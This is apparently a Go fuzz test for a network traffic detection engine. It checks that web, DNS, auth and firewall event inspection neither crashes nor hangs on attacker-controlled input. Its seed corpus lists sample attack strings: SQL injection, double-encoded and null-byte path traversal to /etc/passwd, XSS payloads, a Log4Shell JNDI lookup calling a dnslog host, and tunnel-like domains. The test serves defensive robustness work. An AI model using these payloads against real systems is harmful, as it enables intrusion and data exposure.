package detect

import (
	"testing"
	"time"

	"netsa/internal/config"
	"netsa/internal/model"
)

// 模糊测试：URI、UA、DNS 域名、账号都由攻击者控制，检测引擎（多轮解码、归一化、正则）与行为检测对任意输入都不能崩溃或超时。
// 运行：go test ./internal/detect -run XXX -fuzz FuzzInspect -fuzztime 60s
func FuzzInspect(f *testing.F) {
	for _, s := range []string{
		"/index.php?id=1%27%20union%20select%201,2,3--", "/%252e%252e%252fetc%252fpasswd", "/?q=%u003cscript%u003e", "/a?x=&#x3c;svg onload=1&#x3e;",
		"/${jndi:ldap://x.dnslog.cn/a}", "/shell.jsp/", "/../../../../etc/passwd%00.png", "/?" + string(make([]byte, 300)), "%", "%%%%", "%u", "&#",
		"a1b2c3.dnslog.cn", "xjvkqzpwmtrhbnc7k.com", "mzxw6ytboi2dqmjqgezdgnbvgy3tqojqgeztsmzsgq2tmnzyhe4dama.t.example.com", "",
	} {
		f.Add(s, "Mozilla/5.0", 200)
	}
	e, err := NewEngine("", 1)
	if err != nil {
		f.Fatal(err)
	}
	b := NewBehavior(config.Default().Detect.Thresholds)
	f.Fuzz(func(t *testing.T, s, ua string, status int) {
		now := time.Now()
		for _, ev := range []*model.Event{
			{Kind: model.KindWeb, SrcIP: "198.51.100.1", Method: "GET", URI: s, UA: ua, Status: status, Time: now, Raw: s},
			{Kind: model.KindWeb, SrcIP: "198.51.100.1", Method: "POST", URI: "/login", Status: status, Time: now, UA: s},
			{Kind: model.KindDNS, SrcIP: "10.0.0.5", Host: s, QType: "A", RCode: "NXDOMAIN", Time: now},
			{Kind: model.KindAuth, SrcIP: "198.51.100.2", User: s, Service: ua, Action: model.ActionDeny, Time: now},
			{Kind: model.KindFirewall, SrcIP: "198.51.100.3", DstIP: "43.242.97.35", DstPort: status, Threat: s, Action: model.ActionAllow, Time: now},
		} {
			start := time.Now()
			for _, h := range e.Inspect(ev) {
				if h.RuleID == "" || h.Severity < model.SevInfo || h.Severity > model.SevCritical {
					t.Fatalf("命中不完整: %+v", h)
				}
			}
			b.Observe(ev)
			if d := time.Since(start); d > 200*time.Millisecond {
				t.Fatalf("单条检测耗时 %v（可能存在回溯或循环）：%q", d, s)
			}
		}
	})
}
